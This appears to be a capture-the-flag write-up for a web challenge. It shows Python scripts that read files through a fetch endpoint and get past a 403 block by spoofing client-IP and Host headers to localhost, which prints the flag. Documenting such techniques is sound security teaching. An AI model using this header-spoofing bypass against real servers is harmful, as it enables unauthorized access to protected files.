# README

## Description
```
Read me if you can!! 
```

## Writeup

Visiting the website the website we see an input field asking for a file to read. <br/>
For this purpose I wrote a script for efficiency. <br/>
```py
import requests

base_URL = 'http://66.228.53.87:8989/'

file = "text.txt"

req = requests.get(f'{base_URL}fetch?file={file}')

print(req.text)
```

Executing the script we get a nromal response. <br/>
```sh
kali@kali python3 solve.py
{
  "result": "Yes! You can read files! Dont ask for hint its ezz!!"
}
```

Trying to read `flag.txt` results in an error. <br/>
```sh
kali@kali python3 solve.py
{
  "result": "403 Access Denied"
}
```

To bypass the `403` error I used different `headers` from [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses). <br/>
```py
import requests

base_URL = 'http://66.228.53.87:8989/'

file_path = "flag.txt"

# headers to bypass 403 Access Denied error
headers = {
    'X-Originating-IP': '127.0.0.1',
    'X-Forwarded-For': '127.0.0.1',
    'X-Forwarded': '127.0.0.1',
    'Forwarded-For': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
    'X-ProxyUser-Ip': '127.0.0.1',
    'X-Original-URL': '127.0.0.1',
    'Client-IP': '127.0.0.1',
    'True-Client-IP': '127.0.0.1',
    'Cluster-Client-IP': '127.0.0.1',
    'X-ProxyUser-Ip': '127.0.0.1',
    'Host': 'localhost'
}

req = requests.get(f'{base_URL}fetch?file={file_path}', headers=headers)

print(req.text)
```

Executing the script with headers gets us the flag. <br/>
```sh
kali@kali python3 solve.py
{
  "result":"KCTF{kud05w3lld0n3!}"
}
```

This concludes the writeup.
